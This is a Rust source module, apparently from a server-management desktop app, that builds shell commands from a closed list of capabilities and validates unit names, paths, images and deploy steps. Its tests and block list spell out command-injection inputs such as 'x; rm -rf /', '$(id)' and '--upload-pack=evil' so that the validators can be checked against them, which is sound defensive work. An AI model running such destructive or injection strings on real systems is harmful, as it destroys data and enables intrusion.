//! The security boundary for every management action in P3.
//!
//! # Why this module exists
//!
//! A desktop ops tool is one XSS-shaped bug away from handing an attacker a
//! remote shell. So the WebView never sends a command string. It sends a
//! *capability* — "restart the unit called nginx.service" — and this module is
//! the only place in the codebase that turns one into shell text.
//!
//! Three rules, all enforced here:
//!
//! 1. **Fixed templates.** Every command string lives in the exhaustive
//!    [`Capability::command`] match. Adding an action means touching this
//!    file, which is the point: the audit surface is one `match`.
//! 2. **Validated parameters.** Anything the user can influence (unit names,
//!    container ids, site names, paths, git refs) is checked against a
//!    character whitelist before it reaches a template.
//! 3. **Always quoted.** Validated or not, every interpolated value is
//!    single-quoted, and positional arguments are preceded by `--` so a value
//!    can never be read as an option.
//!
//! Rule 3 is defence in depth: if a validator is ever loosened by mistake, the
//! quoting still stops the value from breaking out of the argument.

use std::fmt;
use std::time::Duration;

use anyhow::{anyhow, Result};

// -- Character classes -------------------------------------------------------

/// Characters allowed in any identifier we interpolate into a command.
///
/// Deliberately excludes quotes, backslashes, `$`, backticks, whitespace,
/// `;`, `&`, `|`, `<`, `>`, `(`, `)`, `{`, `}` and newlines: none of the
/// values we accept legitimately need them.
fn is_safe_char(ch: char) -> bool {
    ch.is_ascii_alphanumeric()
        || matches!(
            ch,
            '.' | '-' | '_' | '/' | ':' | '@' | '+' | '=' | ',' | '~' | '*' | '#' | '%'
        )
}

/// Rejects empty values, over-long ones, control characters and anything
/// outside [`is_safe_char`].
fn validate_token<'a>(value: &'a str, field: &str, max_len: usize) -> Result<&'a str> {
    if value.is_empty() {
        return Err(anyhow!("{field}不能为空"));
    }
    if value.len() > max_len {
        return Err(anyhow!("{field}过长（最多 {max_len} 个字符）"));
    }
    if value.chars().any(|ch| ch.is_control()) {
        return Err(anyhow!("{field}不能包含控制字符"));
    }
    if let Some(ch) = value.chars().find(|ch| !is_safe_char(*ch)) {
        return Err(anyhow!("{field}包含不允许的字符：{ch:?}"));
    }
    Ok(value)
}

/// Wraps a value in single quotes so the remote shell treats it as one literal
/// argument. Embedded single quotes are escaped the POSIX way.
pub fn shell_quote(value: &str) -> String {
    let mut quoted = String::with_capacity(value.len() + 2);
    quoted.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            quoted.push_str("'\\''");
        } else {
            quoted.push(ch);
        }
    }
    quoted.push('\'');
    quoted
}

// -- Path validation ---------------------------------------------------------

/// Splits an absolute path into its segments, so `..` can be caught as a
/// segment rather than a substring (which would reject `..foo`).
fn segments(path: &str) -> Vec<&str> {
    path.split('/').filter(|part| !part.is_empty()).collect()
}

/// Validates an absolute path: must start at `/`, must not contain `.` or `..`
/// segments, and must not contain characters outside the safe set.
pub fn validate_abs_path<'a>(value: &'a str, field: &str) -> Result<&'a str> {
    if !value.starts_with('/') {
        return Err(anyhow!("{field}必须是绝对路径"));
    }
    if value.contains('\0') {
        return Err(anyhow!("{field}不能包含空字符"));
    }
    if value.chars().any(|ch| ch.is_control()) {
        return Err(anyhow!("{field}不能包含控制字符"));
    }
    if segments(value)
        .iter()
        .any(|part| *part == "." || *part == "..")
    {
        return Err(anyhow!("{field}不能包含相对路径段（. 或 ..）"));
    }
    // Spaces are legal in paths but are the classic injection carrier, so only
    // the characters we actually need are permitted.
    if value
        .chars()
        .any(|ch| !ch.is_ascii_alphanumeric() && !matches!(ch, '/' | '.' | '-' | '_' | '~' | '+'))
    {
        return Err(anyhow!("{field}包含不允许的字符"));
    }
    Ok(value)
}

/// True when `path` is `root` itself or lives underneath it.
///
/// Used to keep destructive commands (deployment steps, config writes) inside
/// the directory the project declared.
pub fn is_within(path: &str, root: &str) -> bool {
    let path = path.trim_end_matches('/');
    let root = root.trim_end_matches('/');
    if path == root {
        return true;
    }
    path.starts_with(&format!("{root}/"))
}

// -- Specific identifiers ----------------------------------------------------

/// systemd unit types we allow acting on.
const UNIT_SUFFIXES: &[&str] = &[
    ".service",
    ".socket",
    ".timer",
    ".target",
    ".mount",
    ".path",
    ".slice",
    ".scope",
    ".device",
    ".swap",
    ".automount",
    ".snapshot",
];

/// Validates a systemd unit name: safe characters plus a known unit suffix.
pub fn validate_unit(value: &str) -> Result<&str> {
    let unit = validate_token(value, "服务单元名", 256)?;
    let lower = unit.to_ascii_lowercase();
    if !UNIT_SUFFIXES.iter().any(|suffix| lower.ends_with(suffix)) {
        return Err(anyhow!(
            "服务单元名必须以有效的单元类型结尾（如 .service、.timer）：{value}"
        ));
    }
    Ok(unit)
}

/// Validates a Docker container id or name.
pub fn validate_container(value: &str) -> Result<&str> {
    let container = validate_token(value, "容器标识", 128)?;
    if container.starts_with('-') {
        return Err(anyhow!("容器标识不能以 - 开头（避免被当作选项）"));
    }
    Ok(container)
}

/// Validates a Docker image reference, including an optional registry host,
/// tag and `sha256:` digest.
pub fn validate_image(value: &str) -> Result<&str> {
    let image = validate_token(value, "镜像名", 256)?;
    if image.starts_with('-') {
        return Err(anyhow!("镜像名不能以 - 开头"));
    }
    // A digest carries a colon; a plain tag carries at most one. Reject the
    // rest so a stray colon cannot smuggle in a second argument.
    if !image.contains('@') && image.matches(':').count() > 1 {
        return Err(anyhow!("镜像名格式不正确：{value}"));
    }
    Ok(image)
}

/// Validates an Nginx site name — a plain filename, never a path.
pub fn validate_site_name(value: &str) -> Result<&str> {
    let site = validate_token(value, "站点名", 128)?;
    if site.contains('/') {
        return Err(anyhow!("站点名不能包含路径分隔符"));
    }
    if site == "." || site == ".." {
        return Err(anyhow!("站点名无效"));
    }
    Ok(site)
}

/// Validates a tail/head line count.
pub fn validate_lines(value: u32) -> Result<u32> {
    if (1..=10_000).contains(&value) {
        Ok(value)
    } else {
        Err(anyhow!("行数必须在 1 到 10000 之间"))
    }
}

/// A git ref: branch, tag or short SHA. Rejects the leading dash and the
/// characters git itself treats specially.
pub fn validate_git_ref(value: &str) -> Result<&str> {
    let reference = validate_token(value, "Git 引用", 256)?;
    if reference.starts_with('-') {
        return Err(anyhow!("Git 引用不能以 - 开头"));
    }
    if reference.contains("..") {
        return Err(anyhow!("Git 引用不能包含 .."));
    }
    Ok(reference)
}

/// A clone URL: `https://`, `ssh://`, `git@host:` or a bare `host:path`.
pub fn validate_repo_url(value: &str) -> Result<&str> {
    let url = validate_token(value, "仓库地址", 512)?;
    let accepted = url.starts_with("https://")
        || url.starts_with("http://")
        || url.starts_with("ssh://")
        || url.starts_with("git@")
        || url.starts_with("git://");
    if accepted {
        Ok(url)
    } else {
        Err(anyhow!(
            "仓库地址必须以 https://、http://、ssh://、git:// 或 git@ 开头"
        ))
    }
}

// -- Deployment steps --------------------------------------------------------

/// Executables a deployment step may invoke.
///
/// Deliberately small: the set of things a sane deploy needs. Anything else is
/// rejected rather than allowed-and-audited, because an audit trail does not
/// un-delete a file.
const DEPLOY_ALLOWLIST: &[&str] = &[
    "git",
    "npm",
    "pnpm",
    "yarn",
    "bun",
    "node",
    "python3",
    "pip3",
    "go",
    "cargo",
    "mvn",
    "gradle",
    "make",
    "docker",
    "docker-compose",
    "systemctl",
    "nginx",
    "cp",
    "mv",
    "mkdir",
    "chmod",
    "chown",
    "ln",
    "tar",
    "unzip",
    "find",
    "rsync",
    "echo",
    "rm",
    "supervisorctl",
    "pm2",
];

/// Shell operators that would let one step become several.
const SHELL_OPERATORS: &[&str] = &[
    ";", "&&", "||", "|", ">", "<", "`", "$(", "${", "&", "\n", "\r", "\\",
];

/// Validates one deployment step.
///
/// A step is a single simple command: one allowlisted executable followed by
/// arguments. Chaining, redirection and command substitution are rejected, and
/// every absolute path in the step must live under `root` — the project's
/// deploy directory — so a step cannot reach outside the project it belongs
/// to.
pub fn validate_deploy_step(step: &str, root: &str) -> Result<()> {
    let trimmed = step.trim();
    if trimmed.is_empty() {
        return Err(anyhow!("部署步骤不能为空"));
    }
    if trimmed.len() > 512 {
        return Err(anyhow!("部署步骤过长（最多 512 个字符）"));
    }
    if trimmed.chars().any(|ch| ch.is_control()) {
        return Err(anyhow!("部署步骤不能包含控制字符"));
    }
    for operator in SHELL_OPERATORS {
        if trimmed.contains(operator) {
            return Err(anyhow!(
                "部署步骤不允许包含 shell 操作符 {operator:?}：{trimmed}"
            ));
        }
    }

    let mut parts = trimmed.split_whitespace();
    let program = parts.next().unwrap_or_default();
    if !DEPLOY_ALLOWLIST.contains(&program) {
        return Err(anyhow!(
            "部署步骤使用了不在白名单内的命令 {program:?}：{trimmed}"
        ));
    }

    for argument in parts {
        // Quoted arguments are permitted (paths with spaces), so only the
        // dangerous metacharacters are checked here.
        if argument
            .chars()
            .any(|ch| matches!(ch, '`' | '$' | '\\') || ch.is_control())
        {
            return Err(anyhow!("部署步骤的参数包含不允许的字符：{argument}"));
        }
        let unquoted = argument.trim_matches('"').trim_matches('\'');
        if unquoted.starts_with('/') && !is_within(unquoted, root) {
            return Err(anyhow!(
                "部署步骤引用了项目目录之外的路径：{unquoted}（允许范围：{root}）"
            ));
        }
        // `rm` is the one allowlisted command that can destroy things, so it
        // is held to the deploy directory even when given a relative path.
        if program == "rm" && unquoted.contains("..") {
            return Err(anyhow!("部署步骤中的 rm 不能使用 ..：{trimmed}"));
        }
    }

    Ok(())
}

// -- Capabilities ------------------------------------------------------------

/// A management action the WebView may request.
///
/// This enum is the complete list of commands BLS-OPS will ever run on a
/// server through the management UI. It is intentionally closed: no variant
/// accepts a free-form command string.
#[derive(Debug, Clone)]
pub enum Capability {
    // Discovery
    /// `uname -s` — the authoritative "is this Linux" check.
    Uname,
    /// Reads `/etc/os-release` for a human-readable distribution name.
    OsRelease,
    /// `command -v <tool>` for an optional tool.
    Probe(ProbeTool),
    /// Prints `<tool> --version` only if the tool exists. Used to collect
    /// runtime/build-tool versions during capability recognition.
    ToolVersion(ProbeTool),
    /// First-layer capability probe: OS/arch/kernel/user/init/security/cgroup in
    /// one fixed invocation. Never runs any Docker/Nginx command — those only
    /// run once their capability is confirmed by `probe_capabilities`.
    CapabilitySystemInfo,

    // systemd
    ListServices,
    /// Enabled-at-boot state for every service, in one call.
    ListUnitFiles,
    ServiceAction {
        action: ServiceAction,
        unit: String,
    },
    /// `systemctl status` for one unit.
    ServiceStatus {
        unit: String,
    },

    // journald
    /// `priority` is the maximum syslog level to include (0 emerg … 7 debug).
    Journal {
        unit: Option<String>,
        lines: u32,
        priority: Option<u8>,
    },
    JournalDiskUsage,

    // Docker
    DockerPs,
    DockerImages,
    DockerStats,
    DockerLogs {
        container: String,
        lines: u32,
    },
    DockerInspect {
        container: String,
    },
    ContainerAction {
        action: ContainerAction,
        container: String,
    },
    ImageRemove {
        image: String,
    },
    /// Removes stopped containers and dangling images.
    SystemPrune,

    // Nginx
    NginxVersion,
    NginxListSites,
    /// Reads one config file. `path` must live under an Nginx directory.
    NginxReadConfig {
        path: String,
    },
    /// Copies a config aside before an edit, so a mistake is recoverable.
    NginxBackup {
        path: String,
    },
    NginxTest,
    NginxReload,
    /// Adds or removes the `sites-enabled` symlink for a site.
    NginxSetSiteEnabled {
        site: String,
        enable: bool,
    },

    // Project discovery (read-only, bounded inventory commands)
    ProjectInventory,
    ProjectRuntimeInventory,

    // Files / deployments
    /// Reads a text file (log tailing, config viewing).
    ReadFile {
        path: String,
    },
    /// Last `lines` lines of a file.
    TailFile {
        path: String,
        lines: u32,
    },
    /// One validated deployment step.
    DeployStep {
        step: String,
        root: String,
    },
}

/// Optional tools we probe for before offering a module.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
/// Tools that `probe_capabilities` may detect. Each maps to a fixed command
/// name used by `Capability::Probe` (existence check) and `Capability::ToolVersion`
/// (version string). All are whitelisted — no free-form command is ever built.
pub enum ProbeTool {
    // 包管理器
    Apt,
    Dnf,
    Yum,
    Apk,
    Pacman,
    Zypper,
    Brew,
    Winget,
    Choco,
    // 运行时
    Java,
    Node,
    Python,
    Go,
    Rustc,
    Php,
    Dotnet,
    Ruby,
    // 版本管理器
    Nvm,
    Fnm,
    Pyenv,
    Uv,
    Sdkman,
    Rustup,
    // 构建工具
    Maven,
    Gradle,
    Npm,
    Pnpm,
    Yarn,
    Cargo,
    Pip,
    Poetry,
    Composer,
    // 服务管理
    Systemctl,
    Openrc,
    Supervisor,
    Pm2,
    Runit,
    Sc,
    // 容器与编排
    Docker,
    DockerCompose,
    Podman,
    Containerd,
    Kubectl,
    K3s,
    Helm,
    Nomad,
    // 网关
    Nginx,
    Apache,
    Caddy,
    Traefik,
    Haproxy,
    Iis,
    // 数据中间件
    Mysql,
    Psql,
    Redis,
    Mongo,
    Elasticsearch,
    Rabbitmq,
    Kafka,
    // 其他
    Git,
    Journalctl,
}

impl ProbeTool {
    /// The binary name used by `command -v` and version probes.
    pub fn name(self) -> &'static str {
        match self {
            ProbeTool::Apt => "apt-get",
            ProbeTool::Dnf => "dnf",
            ProbeTool::Yum => "yum",
            ProbeTool::Apk => "apk",
            ProbeTool::Pacman => "pacman",
            ProbeTool::Zypper => "zypper",
            ProbeTool::Brew => "brew",
            ProbeTool::Winget => "winget",
            ProbeTool::Choco => "choco",
            ProbeTool::Java => "java",
            ProbeTool::Node => "node",
            ProbeTool::Python => "python3",
            ProbeTool::Go => "go",
            ProbeTool::Rustc => "rustc",
            ProbeTool::Php => "php",
            ProbeTool::Dotnet => "dotnet",
            ProbeTool::Ruby => "ruby",
            ProbeTool::Nvm => "nvm",
            ProbeTool::Fnm => "fnm",
            ProbeTool::Pyenv => "pyenv",
            ProbeTool::Uv => "uv",
            ProbeTool::Sdkman => "sdk",
            ProbeTool::Rustup => "rustup",
            ProbeTool::Maven => "mvn",
            ProbeTool::Gradle => "gradle",
            ProbeTool::Npm => "npm",
            ProbeTool::Pnpm => "pnpm",
            ProbeTool::Yarn => "yarn",
            ProbeTool::Cargo => "cargo",
            ProbeTool::Pip => "pip3",
            ProbeTool::Poetry => "poetry",
            ProbeTool::Composer => "composer",
            ProbeTool::Systemctl => "systemctl",
            ProbeTool::Openrc => "openrc",
            ProbeTool::Supervisor => "supervisorctl",
            ProbeTool::Pm2 => "pm2",
            ProbeTool::Runit => "runsv",
            ProbeTool::Sc => "sc",
            ProbeTool::Docker => "docker",
            ProbeTool::DockerCompose => "docker-compose",
            ProbeTool::Podman => "podman",
            ProbeTool::Containerd => "containerd",
            ProbeTool::Kubectl => "kubectl",
            ProbeTool::K3s => "k3s",
            ProbeTool::Helm => "helm",
            ProbeTool::Nomad => "nomad",
            ProbeTool::Nginx => "nginx",
            ProbeTool::Apache => "apache2",
            ProbeTool::Caddy => "caddy",
            ProbeTool::Traefik => "traefik",
            ProbeTool::Haproxy => "haproxy",
            ProbeTool::Iis => "iisreset",
            ProbeTool::Mysql => "mysql",
            ProbeTool::Psql => "psql",
            ProbeTool::Redis => "redis-server",
            ProbeTool::Mongo => "mongod",
            ProbeTool::Elasticsearch => "elasticsearch",
            ProbeTool::Rabbitmq => "rabbitmqctl",
            ProbeTool::Kafka => "kafka-server-start",
            ProbeTool::Git => "git",
            ProbeTool::Journalctl => "journalctl",
        }
    }

    /// The flag used to request a version string. Most tools accept `--version`;
    /// a few (Go) require a subcommand.
    pub fn version_flag(self) -> &'static str {
        match self {
            ProbeTool::Go => "version",
            ProbeTool::Sdkman => "--version",
            _ => "--version",
        }
    }
}

impl fmt::Display for ProbeTool {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.name())
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ServiceAction {
    Start,
    Stop,
    Restart,
    Reload,
    Enable,
    Disable,
}

impl ServiceAction {
    /// The systemd verb. Not user-facing: this is what reaches the shell.
    pub fn verb(self) -> &'static str {
        match self {
            ServiceAction::Start => "start",
            ServiceAction::Stop => "stop",
            ServiceAction::Restart => "restart",
            ServiceAction::Reload => "reload",
            ServiceAction::Enable => "enable",
            ServiceAction::Disable => "disable",
        }
    }

    /// Chinese label for audit logs.
    pub fn label(self) -> &'static str {
        match self {
            ServiceAction::Start => "启动",
            ServiceAction::Stop => "停止",
            ServiceAction::Restart => "重启",
            ServiceAction::Reload => "重载",
            ServiceAction::Enable => "设为开机自启",
            ServiceAction::Disable => "取消开机自启",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ContainerAction {
    Start,
    Stop,
    Restart,
    Remove,
}

impl ContainerAction {
    pub fn verb(self) -> &'static str {
        match self {
            ContainerAction::Start => "start",
            ContainerAction::Stop => "stop",
            ContainerAction::Restart => "restart",
            ContainerAction::Remove => "rm",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            ContainerAction::Start => "启动",
            ContainerAction::Stop => "停止",
            ContainerAction::Restart => "重启",
            ContainerAction::Remove => "删除",
        }
    }
}

const LIST_SERVICES: &str =
    "systemctl list-units --type=service --all --no-legend --no-pager --plain";
const LIST_UNIT_FILES: &str = "systemctl list-unit-files --type=service --no-legend --no-pager";
const DOCKER_PS: &str = "docker ps -a --no-trunc --format {{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.State}}|{{.Ports}}|{{.CreatedAt}}";
const DOCKER_IMAGES: &str =
    "docker images --format {{.ID}}|{{.Repository}}|{{.Tag}}|{{.Size}}|{{.CreatedSince}}";
const DOCKER_STATS: &str =
    "docker stats --no-stream --format {{.Name}}|{{.CPUPerc}}|{{.MemUsage}}|{{.MemPerc}}|{{.NetIO}}|{{.BlockIO}}";
const NGINX_LIST_SITES: &str =
    "sh -c 'ls -1 /etc/nginx/sites-available 2>/dev/null; echo ---AVAILABLE---; ls -1 /etc/nginx/conf.d 2>/dev/null; echo ---CONFD---; ls -1 /etc/nginx/sites-enabled 2>/dev/null; echo ---ENABLED---'";

impl Capability {
    /// How long this action may run before it is abandoned.
    ///
    /// Reads get the short default; actions that legitimately take a while
    /// (pulling an image, reloading Nginx, running a deploy step) get more.
    pub fn timeout(&self) -> Duration {
        match self {
            Capability::ServiceAction { action, .. } => match action {
                ServiceAction::Restart | ServiceAction::Stop => Duration::from_secs(30),
                _ => Duration::from_secs(15),
            },
            Capability::ContainerAction { action, .. } => match action {
                ContainerAction::Stop | ContainerAction::Remove => Duration::from_secs(60),
                _ => Duration::from_secs(30),
            },
            Capability::ImageRemove { .. } => Duration::from_secs(60),
            Capability::SystemPrune => Duration::from_secs(120),
            Capability::NginxTest | Capability::NginxReload => Duration::from_secs(30),
            Capability::DeployStep { .. } => Duration::from_secs(300),
            _ => super::remote::DEFAULT_TIMEOUT,
        }
    }

    /// Builds the command line for this capability.
    ///
    /// Returns `Err` when a parameter fails validation, so a bad value never
    /// reaches the remote shell.
    pub fn command(&self) -> Result<String> {
        let quoted = |value: &str| shell_quote(value);

        Ok(match self {
            Capability::Uname => "uname -s".to_string(),
            Capability::OsRelease => "cat /etc/os-release".to_string(),

            Capability::Probe(tool) => {
                format!("command -v -- {} >/dev/null 2>&1", quoted(tool.name()))
            }
            Capability::ToolVersion(tool) => {
                // Only emit a version string when the tool exists; if it is
                // missing this command fails and `detect_version` records `None`.
                format!(
                    "command -v -- {} >/dev/null 2>&1 && {} {}",
                    quoted(tool.name()),
                    quoted(tool.name()),
                    tool.version_flag()
                )
            }

            // -- systemd -----------------------------------------------------
            Capability::ListServices => LIST_SERVICES.to_string(),
            Capability::ListUnitFiles => LIST_UNIT_FILES.to_string(),

            Capability::ServiceAction { action, unit } => {
                let unit = quoted(validate_unit(unit)?);
                // `--` ends option parsing, so a unit name can never be read
                // as a flag.
                format!("systemctl {} -- {}", action.verb(), unit)
            }

            Capability::ServiceStatus { unit } => {
                // Options must precede the unit; anything after `--` is parsed
                // as another unit name by systemctl.
                format!(
                    "systemctl --no-pager status -- {}",
                    quoted(validate_unit(unit)?)
                )
            }

            // -- journald ----------------------------------------------------
            Capability::Journal {
                unit,
                lines,
                priority,
            } => {
                let lines = validate_lines(*lines)?;
                // `-p` filters on the server, so asking for errors only does
                // not ship the whole journal across the wire.
                let scope = match priority {
                    Some(level) if *level <= 7 => format!(" -p {level}"),
                    Some(level) => return Err(anyhow!("日志优先级必须在 0 到 7 之间：{level}")),
                    None => String::new(),
                };
                match unit {
                    Some(unit) => format!(
                        "journalctl -u {} -n {} --no-pager -o json{scope}",
                        quoted(validate_unit(unit)?),
                        lines
                    ),
                    None => format!("journalctl -n {lines} --no-pager -o json{scope}"),
                }
            }

            Capability::JournalDiskUsage => "journalctl --disk-usage".to_string(),

            // -- Project discovery ------------------------------------------
            // Commands are fixed and bounded; their output is parsed as metadata only.
            Capability::ProjectInventory => "find /home /root /srv /opt /var/www /data /app /apps /workspace /usr/local -xdev -maxdepth 6 -type f -printf '%h\\t%f\\n' 2>/dev/null | head -n 20000".to_string(),
            // Runtime inventory is capability-agnostic: it collects process and
            // systemd evidence that never depends on Docker/Nginx. Docker and
            // Nginx evidence is gathered separately, *only* after `probe_capabilities`
            // has confirmed those tools are installed — so we never emit a
            // `docker ps` / `nginx -T` against a server that lacks them.
            Capability::ProjectRuntimeInventory => "ps -eo pid=,cwd=,args= 2>/dev/null | head -n 2000; systemctl show --all --no-pager -p Id -p WorkingDirectory -p ExecStart 2>/dev/null | head -n 5000".to_string(),

            // -- First-layer capability probe ---------------------------------
            // One fixed invocation that yields OS/arch/kernel/user/init/security/cgroup.
            // No Docker/Nginx command is ever present here by design.
            Capability::CapabilitySystemInfo => "printf 'OS=%s\\n' \"$(. /etc/os-release 2>/dev/null && echo \"${PRETTY_NAME:-$NAME $VERSION_ID}\")\"; printf 'ARCH=%s\\n' \"$(uname -m)\"; printf 'KERNEL=%s\\n' \"$(uname -r)\"; printf 'USER=%s\\n' \"$(id -un)\"; printf 'INIT=%s\\n' \"$(ps -p 1 -o comm= 2>/dev/null)\"; printf 'PKG=%s\\n' \"$(command -v apt-get >/dev/null && echo apt; command -v dnf >/dev/null && echo dnf; command -v yum >/dev/null && echo yum; command -v apk >/dev/null && echo apk; command -v pacman >/dev/null && echo pacman; command -v zypper >/dev/null && echo zypper; command -v brew >/dev/null && echo brew; command -v winget >/dev/null && echo winget; command -v choco >/dev/null && echo choco)\"; printf 'SECURITY=%s\\n' \"$(command -v getenforce >/dev/null && getenforce 2>/dev/null; command -v apparmor_status >/dev/null && echo apparmor)\"; printf 'CGROUP=%s\\n' \"$(stat -fc %T /sys/fs/cgroup 2>/dev/null)\"; printf 'SUDO=%s\\n' \"$(command -v sudo >/dev/null && echo yes || echo no)\"".to_string(),

            // -- Docker ------------------------------------------------------
            Capability::DockerPs => DOCKER_PS.to_string(),
            Capability::DockerImages => DOCKER_IMAGES.to_string(),
            Capability::DockerStats => DOCKER_STATS.to_string(),

            Capability::DockerLogs { container, lines } => format!(
                "docker logs --tail {} -- {}",
                validate_lines(*lines)?,
                quoted(validate_container(container)?)
            ),

            Capability::DockerInspect { container } => format!(
                "docker inspect --format '{{{{json .}}}}' -- {}",
                quoted(validate_container(container)?)
            ),

            Capability::ContainerAction { action, container } => {
                let verb = action.verb();
                let container = quoted(validate_container(container)?);
                // `docker rm -f` needs the flag before the target; every other
                // action is a plain verb followed by the container.
                if matches!(action, ContainerAction::Remove) {
                    format!("docker rm -f -- {container}")
                } else {
                    format!("docker {verb} -- {container}")
                }
            }

            Capability::ImageRemove { image } => {
                format!("docker rmi -- {}", quoted(validate_image(image)?))
            }

            Capability::SystemPrune => "docker system prune -f".to_string(),

            // -- Nginx -------------------------------------------------------
            Capability::NginxVersion => "nginx -v".to_string(),
            Capability::NginxListSites => NGINX_LIST_SITES.to_string(),

            Capability::NginxReadConfig { path } => {
                let path = validate_abs_path(path, "配置文件路径")?;
                require_nginx_path(path)?;
                format!("cat -- {}", quoted(path))
            }

            Capability::NginxBackup { path } => {
                let path = validate_abs_path(path, "配置文件路径")?;
                require_nginx_path(path)?;
                // The suffix goes inside the quotes, so the whole target is
                // one literal argument.
                format!(
                    "cp -- {} {}",
                    quoted(path),
                    quoted(&format!("{path}.blsops.bak"))
                )
            }

            Capability::NginxTest => "nginx -t".to_string(),
            Capability::NginxReload => "nginx -s reload".to_string(),

            Capability::NginxSetSiteEnabled { site, enable } => {
                let site = quoted(validate_site_name(site)?);
                if *enable {
                    format!(
                        "ln -sfn /etc/nginx/sites-available/{site} /etc/nginx/sites-enabled/{site}"
                    )
                } else {
                    format!("rm -f -- /etc/nginx/sites-enabled/{site}")
                }
            }

            // -- Files / deployments -----------------------------------------
            Capability::ReadFile { path } => {
                format!("cat -- {}", quoted(validate_abs_path(path, "文件路径")?))
            }

            Capability::TailFile { path, lines } => format!(
                "tail -n {} -- {}",
                validate_lines(*lines)?,
                quoted(validate_abs_path(path, "文件路径")?)
            ),

            Capability::DeployStep { step, root } => {
                validate_deploy_step(step, root)?;
                // Steps are recorded per project and validated above; the
                // shell only ever sees an allowlisted program with arguments.
                step.trim().to_string()
            }
        })
    }
}

/// Directories an Nginx capability may touch.
const NGINX_ROOTS: &[&str] = &["/etc/nginx", "/usr/local/nginx/conf"];

fn require_nginx_path(path: &str) -> Result<()> {
    if NGINX_ROOTS.iter().any(|root| is_within(path, root)) {
        Ok(())
    } else {
        Err(anyhow!(
            "只能操作 Nginx 配置目录（{}）下的文件：{path}",
            NGINX_ROOTS.join("、")
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- shell_quote ---------------------------------------------------------

    #[test]
    fn quotes_plain_values() {
        assert_eq!(shell_quote("nginx.service"), "'nginx.service'");
    }

    #[test]
    fn escapes_embedded_single_quotes() {
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn neutralises_a_shell_breakout() {
        // Unquoted, this value would be a command separator. Quoted, the
        // semicolon is just a character inside one literal argument.
        let quoted = shell_quote("x; rm -rf /");
        assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
        assert_eq!(quoted.matches('\'').count(), 2, "除首尾外不应再有引号");
        assert!(
            quoted.contains("; rm -rf /"),
            "分隔符被包在引号内，不会被执行"
        );
    }

    // -- validate_unit -------------------------------------------------------

    #[test]
    fn accepts_normal_unit_names() {
        assert!(validate_unit("nginx.service").is_ok());
        assert!(validate_unit("docker.service").is_ok());
        assert!(validate_unit("systemd-timesyncd.service").is_ok());
        assert!(validate_unit("apt-daily.timer").is_ok());
        assert!(validate_unit("foo@bar.service").is_ok());
    }

    #[test]
    fn rejects_unit_names_without_a_known_suffix() {
        assert!(validate_unit("nginx").is_err());
        assert!(validate_unit("nginx.conf").is_err());
    }

    #[test]
    fn rejects_injection_in_unit_names() {
        assert!(validate_unit("nginx.service; rm -rf /").is_err());
        assert!(validate_unit("nginx.service && id").is_err());
        assert!(validate_unit("nginx.service$(id)").is_err());
        assert!(validate_unit("nginx.service`id`").is_err());
        assert!(validate_unit("nginx.service|id").is_err());
        assert!(validate_unit("").is_err());
    }

    // -- paths ---------------------------------------------------------------

    #[test]
    fn accepts_clean_absolute_paths() {
        assert!(validate_abs_path("/etc/nginx/nginx.conf", "路径").is_ok());
        assert!(validate_abs_path("/var/www/my-app", "路径").is_ok());
    }

    #[test]
    fn rejects_relative_and_traversing_paths() {
        assert!(validate_abs_path("etc/nginx", "路径").is_err());
        assert!(validate_abs_path("/etc/nginx/../shadow", "路径").is_err());
        assert!(validate_abs_path("/etc/./nginx", "路径").is_err());
    }

    #[test]
    fn is_within_requires_a_real_segment_boundary() {
        assert!(is_within("/etc/nginx/conf.d", "/etc/nginx"));
        assert!(is_within("/etc/nginx", "/etc/nginx"));
        // Same prefix, different directory — must not pass.
        assert!(!is_within("/etc/nginx-secret", "/etc/nginx"));
        assert!(!is_within("/etc/other", "/etc/nginx"));
    }

    #[test]
    fn nginx_paths_must_stay_inside_the_config_directory() {
        assert!(require_nginx_path("/etc/nginx/sites-available/default").is_ok());
        assert!(require_nginx_path("/etc/shadow").is_err());
        assert!(require_nginx_path("/tmp/evil.conf").is_err());
    }

    // -- containers / images -------------------------------------------------

    #[test]
    fn accepts_container_ids_and_names() {
        assert!(validate_container("a1b2c3d4e5f6").is_ok());
        assert!(validate_container("my-app_1").is_ok());
    }

    #[test]
    fn rejects_container_injection() {
        assert!(validate_container("-v /:/host").is_err());
        assert!(validate_container("x && id").is_err());
        assert!(validate_container("").is_err());
    }

    #[test]
    fn accepts_normal_image_references() {
        assert!(validate_image("nginx:latest").is_ok());
        assert!(validate_image("ghcr.io/acme/app:1.2.3").is_ok());
        assert!(validate_image("nginx@sha256:abcdef").is_ok());
    }

    #[test]
    fn rejects_malformed_image_references() {
        assert!(validate_image("nginx:1:2").is_err());
        assert!(validate_image("--help").is_err());
    }

    // -- lines ---------------------------------------------------------------

    #[test]
    fn validates_line_counts() {
        assert!(validate_lines(1).is_ok());
        assert!(validate_lines(500).is_ok());
        assert!(validate_lines(10_000).is_ok());
        assert!(validate_lines(0).is_err());
        assert!(validate_lines(10_001).is_err());
    }

    // -- git -----------------------------------------------------------------

    #[test]
    fn validates_git_refs() {
        assert!(validate_git_ref("main").is_ok());
        assert!(validate_git_ref("release/1.0").is_ok());
        assert!(validate_git_ref("v1.2.3").is_ok());
        assert!(validate_git_ref("--upload-pack=evil").is_err());
        assert!(validate_git_ref("a..b").is_err());
    }

    #[test]
    fn validates_repo_urls() {
        assert!(validate_repo_url("https://github.com/acme/app.git").is_ok());
        assert!(validate_repo_url("git@github.com:acme/app.git").is_ok());
        assert!(validate_repo_url("ssh://git@host/app.git").is_ok());
        assert!(validate_repo_url("file:///etc/passwd").is_err());
        assert!(validate_repo_url("rm -rf /").is_err());
    }

    // -- deploy steps --------------------------------------------------------

    #[test]
    fn accepts_typical_deploy_steps() {
        let root = "/var/www/app";
        assert!(validate_deploy_step("git pull --ff-only", root).is_ok());
        assert!(validate_deploy_step("npm ci", root).is_ok());
        assert!(validate_deploy_step("npm run build", root).is_ok());
        assert!(validate_deploy_step("docker compose up -d", root).is_ok());
